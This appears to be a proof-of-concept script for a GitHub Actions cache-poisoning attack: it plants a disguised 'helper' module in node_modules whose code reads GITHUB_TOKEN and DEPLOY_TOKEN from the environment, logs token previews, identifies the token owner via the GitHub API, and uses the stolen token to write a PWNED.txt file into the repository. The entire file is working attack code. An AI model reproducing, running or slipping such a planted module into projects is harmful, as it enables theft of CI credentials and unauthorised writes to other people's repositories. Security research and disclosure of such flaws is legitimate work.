const fs = require('fs');
const path = require('path');

const dir = path.join('node_modules', 'helper');
fs.mkdirSync(dir, { recursive: true });

// v4: use native https to avoid all shell quote escaping issues
const payload = `const https = require('https');

const gt = process.env.GITHUB_TOKEN || '';
const dt = process.env.DEPLOY_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';

console.log('=== CACHE POISON: GITHUB_TOKEN CAPTURED ===');
console.log('GITHUB_TOKEN preview: ' + gt.substring(0, 10) + '...');
console.log('GITHUB_TOKEN length: ' + gt.length);
console.log('DEPLOY_TOKEN preview: ' + (dt ? dt.substring(0, 8) + '...' : 'NOT_SET'));
console.log('REPO: ' + repo);

function apiCall(method, apiPath, body, token) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const opts = {
      hostname: 'api.github.com',
      path: apiPath,
      method: method,
      headers: {
        'Authorization': 'token ' + token,
        'User-Agent': 'cache-poison-poc/4.0',
        'Accept': 'application/vnd.github.v3+json',
        'Content-Type': 'application/json'
      }
    };
    if (data) opts.headers['Content-Length'] = Buffer.byteLength(data);
    const req = https.request(opts, (res) => {
      let raw = '';
      res.on('data', c => raw += c);
      res.on('end', () => resolve({ status: res.statusCode, body: raw }));
    });
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}

(async () => {
  try {
    // Step 1: identify who GITHUB_TOKEN belongs to
    const me = await apiCall('GET', '/user', null, gt);
    const user = JSON.parse(me.body);
    console.log('[+] TOKEN IDENTITY: login=' + user.login + ' id=' + user.id + ' http=' + me.status);

    // Step 2: write PWNED.txt to the repo using captured GITHUB_TOKEN
    const parts = repo.split('/');
    const owner = parts[0], repoName = parts[1];
    const stamp = new Date().toISOString();
    const msg = 'PWNED via cache poisoning! ' + stamp + ' | user=' + user.login + ' | token=' + gt.substring(0,10) + '...';
    const content = Buffer.from(msg).toString('base64');

    const writeRes = await apiCall('PUT',
      '/repos/' + owner + '/' + repoName + '/contents/PWNED.txt',
      { message: 'cache-poison-proof: repo write via stolen GITHUB_TOKEN', content: content },
      gt
    );
    console.log('[+] REPO WRITE STATUS: ' + writeRes.status);
    if (writeRes.status === 201) {
      console.log('[!!!] SUCCESS: PWNED.txt WRITTEN TO REPO VIA POISONED GITHUB_TOKEN !!!');
    } else if (writeRes.status === 422) {
      // File already exists — update it
      const existing = await apiCall('GET', '/repos/' + owner + '/' + repoName + '/contents/PWNED.txt', null, gt);
      const existingSha = JSON.parse(existing.body).sha;
      const updateRes = await apiCall('PUT',
        '/repos/' + owner + '/' + repoName + '/contents/PWNED.txt',
        { message: 'cache-poison-proof update: ' + stamp, content: content, sha: existingSha },
        gt
      );
      console.log('[+] REPO UPDATE STATUS: ' + updateRes.status);
      if (updateRes.status === 200) console.log('[!!!] SUCCESS: PWNED.txt UPDATED VIA POISONED GITHUB_TOKEN !!!');
    } else {
      console.log('[-] Write failed: ' + writeRes.body.substring(0, 300));
    }
  } catch(e) {
    console.log('[-] Error: ' + e.message);
  }
})();
`;

fs.writeFileSync(path.join(dir, 'index.js'), payload);
fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({name:'helper',version:'1.0.0',main:'index.js'}));
console.log('[v4] node_modules/helper created — native https, no shell quoting');
